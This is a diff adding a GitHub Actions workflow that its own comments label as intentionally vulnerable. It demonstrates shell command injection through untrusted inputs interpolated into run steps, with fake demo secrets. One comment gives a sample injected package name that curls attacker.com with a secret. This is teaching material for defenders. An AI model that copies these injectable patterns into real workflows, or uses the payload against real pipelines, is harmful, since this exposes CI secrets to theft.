@@ -1,0 +1,66 @@
+name: "VULNERABLE: Package Update Workflow"
+
+# ⚠️ WARNING: This workflow is intentionally vulnerable for demonstration purposes
+# DO NOT use this pattern in production!
+
+on:
+  workflow_dispatch:
+    inputs:
+      package_name:
+        description: 'Package name to update'
+        required: true
+        type: string
+      package_version:
+        description: 'Package version'
+        required: true
+        type: string
+
+jobs:
+  vulnerable-update:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Set up fake secret (for demonstration)
+        run: |
+          echo "DEMO_SECRET=super-secret-api-key-12345" >> $GITHUB_ENV
+          echo "DEMO_AWS_KEY=AKIAIOSFODNN7EXAMPLE" >> $GITHUB_ENV
+
+      - name: Configure Git (VULNERABLE PATTERN 1)
+        run: |
+          git config user.name "${{ github.actor }}"
+          git config user.email "${{ github.actor }}@users.noreply.github.com"
+        # ⚠️ VULNERABLE: github.actor is untrusted and directly interpolated
+
+      - name: Create Branch (VULNERABLE PATTERN 2)
+        run: |
+          git checkout -b "update-${{ inputs.package_name }}-${{ inputs.package_version }}"
+        # ⚠️ VULNERABLE: User inputs directly interpolated into shell command
+        # Attack example: package_name = 'foo"; curl https://attacker.com?secret=$DEMO_SECRET #'
+
+      - name: Update package info (VULNERABLE PATTERN 3)
+        run: |
+          echo "Updating package: ${{ inputs.package_name }}"
+          echo "To version: ${{ inputs.package_version }}"
+          echo "Branch created successfully!"
+        # ⚠️ VULNERABLE: Echo commands can still leak data if injection succeeds
+
+      - name: Simulate package update (VULNERABLE PATTERN 4)
+        run: |
+          echo "Running: npm install ${{ inputs.package_name }}@${{ inputs.package_version }}"
+          # In real scenario: npm install ${{ inputs.package_name }}@${{ inputs.package_version }}
+        # ⚠️ VULNERABLE: Package manager commands with untrusted input
+
+      - name: Create commit (VULNERABLE PATTERN 5)
+        run: |
+          git add -A
+          git commit -m "Update ${{ inputs.package_name }} to ${{ inputs.package_version }}"
+        # ⚠️ VULNERABLE: Commit messages with untrusted input
+
+      - name: Summary
+        run: |
+          echo "✅ Package ${{ inputs.package_name }} updated to ${{ inputs.package_version }}"
+          echo "🔒 Demo secrets are available: $DEMO_SECRET"
+        # ⚠️ This shows the secret is accessible in the workflow
